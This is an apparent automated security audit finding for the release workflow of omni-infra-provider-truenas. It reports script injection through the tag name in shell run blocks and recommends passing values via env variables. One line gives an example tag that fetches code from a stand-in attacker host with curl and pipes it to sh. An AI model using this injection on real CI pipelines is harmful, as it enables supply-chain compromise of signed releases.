# [MEDIUM] Script injection via github.ref_name in shell run blocks, exploitable before signed-tag gate

**File:** [`.github/workflows/release.yaml`](https://github.com/bearbinary/omni-infra-provider-truenas/blob/main/.github/workflows/release.yaml#L66-L535) (lines 66, 103, 120, 121, 122, 133, 134, 140, 155, 185, 208, 213, 218, 225, 321, 333, 341, 343, 364, 411, 412, 430, 533, 535)
**Project:** omni-infra-provider-truenas
**Severity:** MEDIUM  •  **Confidence:** high  •  **Slug:** `other-workflow-script-injection`

## Owners

**Suggested assignee:** `43915749+Cliftonz@users.noreply.github.com` _(via last-committer)_

## Finding

`${{ github.ref_name }}` (the pushed tag name) is interpolated directly into many `run:` shell scripts. Git refname rules permit `$`, backtick, `(`, `)`, `;`, single/double quotes — so a tag like `v0.0.1$(curl attacker.com|sh)` is a legal ref. GitHub renders the expression into the script source before the shell parses it, so the command substitution executes on the runner. The `release` job has `contents: write`, `packages: write`, and `id-token: write` — sufficient for the attacker to publish a poisoned image to GHCR, sign it with the project's keyless cosign identity, and create a GitHub release with arbitrary assets. The signed-tag verification at L117-125 does NOT mitigate this: (1) L103 `git fetch origin refs/tags/${{ github.ref_name }}:...` runs BEFORE the verify step, and (2) the verify step itself at L120 assigns `TAG="${{ github.ref_name }}"` via interpolation, so injection fires inside the gate. To exploit, the attacker needs push-to-tags permission but does NOT need a valid signing key — the injected payload runs before the signature check happens. Branch/tag protection requiring signed pushes would mitigate, but tag protections on a public repo are easy to misconfigure. Other affected sites: L66 (build job VERSION), L133-134, L155, L185-203, L208-225, L321, L333-345, L364-385, L411-442, L530-547.

## Recommendation

Move `${{ github.ref_name }}` and `${{ github.repository }}` into `env:` blocks and reference the resulting shell variables: `env: { TAG: ${{ github.ref_name }}, REPO: ${{ github.repository }} }` then `"$TAG"`/`"$REPO"`. Critically, do this BEFORE the signed-tag verification step (L117) and inside the verification step itself, so the gate genuinely runs first. Additionally, enforce tag protection rules in the repo settings to require signed pushes on `refs/tags/v*`, removing the prerequisite of an authenticated-but-malicious push.

## Recent committers (`git log`)

- Zac Clifton <43915749+Cliftonz@users.noreply.github.com> (2026-04-27)
